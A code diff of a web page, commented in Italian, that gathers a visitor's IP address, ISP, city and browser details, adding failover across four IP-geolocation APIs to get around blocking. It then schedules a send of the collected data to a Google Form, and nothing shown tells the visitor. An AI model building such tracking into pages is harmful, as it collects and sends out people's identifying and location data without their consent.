@@ -178,26 +178,78 @@
         else if (ua.includes("Firefox/")) b = "Firefox";
         document.getElementById('browser').innerText = b;
 
-        // --- 2. NETWORK ---
+        // --- 2. NETWORK (Failover Integrato) ---
         async function runNet() {
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                document.getElementById('ip').innerText = data.ip;
-                document.getElementById('isp').innerText = data.connection?.isp || data.org || "N/A";
-                document.getElementById('geo').innerText = (data.city && data.country) ? `${data.city}, ${data.country}` : "N/A";
-                
-                if (data.latitude) {
-                    // MAPPA AD ALTO CONTRASTO (Voyager con etichette chiare)
-                    const map = L.map('map', {zoomControl: false}).setView([data.latitude, data.longitude], 11);
-                    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
-                        attribution: 'CARTO'
-                    }).addTo(map);
-                    L.marker([data.latitude, data.longitude]).addTo(map);
+            const sources = [
+                { url: 'https://freeipapi.com/api/json', type: 'FreeIpApi' },
+                { url: 'https://ipwho.is/', type: 'IpWhoIs' }, 
+                { url: 'https://ipapi.co/json/', type: 'IpApi' },
+                { url: 'https://api.db-ip.com/v2/free/self', type: 'DbIp' }
+            ];
+
+            let success = false;
+
+            for (const source of sources) {
+                if(success) break;
+                try {
+                    const res = await fetch(source.url);
+                    if(!res.ok) throw new Error("Blocked");
+                    const data = await res.json();
+                    
+                    let ip, isp, city, country, lat, lon;
+
+                    if(source.type === 'FreeIpApi') {
+                        ip = data.ipAddress; isp = "Generic ISP"; city = data.cityName; country = data.countryName;
+                        lat = data.latitude; lon = data.longitude;
+                    }
+                    else if(source.type === 'IpWhoIs') {
+                        if(data.success === false) throw new Error("RateLimit");
+                        ip = data.ip; isp = data.connection?.isp || data.org; city = data.city; country = data.country;
+                        lat = data.latitude; lon = data.longitude;
+                    } 
+                    else if (source.type === 'IpApi') {
+                        if(data.error) throw new Error("RateLimit");
+                        ip = data.ip; isp = data.org; city = data.city; country = data.country_name;
+                        lat = data.latitude; lon = data.longitude;
+                    }
+                    else if (source.type === 'DbIp') {
+                        ip = data.ipAddress; isp = "Generic ISP"; city = data.city; country = data.countryName;
+                        lat = null; lon = null;
+                    }
+
+                    if(!ip) throw new Error("Data incomplete");
+
+                    // Scrittura immediata sul DOM locale
+                    document.getElementById('ip').innerText = ip;
+                    document.getElementById('isp').innerText = isp || "N/A";
+                    document.getElementById('geo').innerText = (city && country) ? `${city}, ${country}` : "N/A";
+                    
+                    // Renderizzazione Mappa
+                    if (lat && lon && typeof L !== 'undefined') {
+                        document.getElementById('map').innerHTML = ""; 
+                        const map = L.map('map', {zoomControl: false}).setView([lat, lon], 11);
+                        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+                            attribution: 'CARTO'
+                        }).addTo(map);
+                        L.marker([lat, lon]).addTo(map);
+                    } else {
+                        document.getElementById('map').innerHTML = "<div style='padding:20px; text-align:center; color:var(--text-muted); font-size:0.8rem;'>Mappa non disponibile (Coordinate assenti)</div>";
+                    }
+
+                    success = true;
+                } catch (e) {
+                    console.log(`${source.type} fallito: ${e.message}`);
                 }
-            } catch (e) {
-                document.getElementById('ip').innerText = "Blocked/Error";
             }
+
+            if (!success) {
+                document.getElementById('ip').innerText = "Blocked/Error";
+                document.getElementById('isp').innerText = "N/A";
+                document.getElementById('geo').innerText = "N/A";
+                document.getElementById('map').innerHTML = "<div style='padding:20px; text-align:center; color:var(--alert); font-size:0.8rem;'>Connessione API fallita (AdBlock attivo)</div>";
+            }
+            
+            // Esegue l'analisi forense e prepara la spedizione
             runForensics();
         }
         runNet();
@@ -217,7 +269,8 @@
             
             if(navigator.brave) document.getElementById('chk-brave').innerText = "YES";
 
-            setTimeout(sendToGoogle, 2000);
+            // Invia i dati strutturati a Google Form solo DOPO che i campi sono stati popolati
+            setTimeout(sendToGoogle, 1500);
         }
 
         // --- 4. INVIO GOOGLE ---
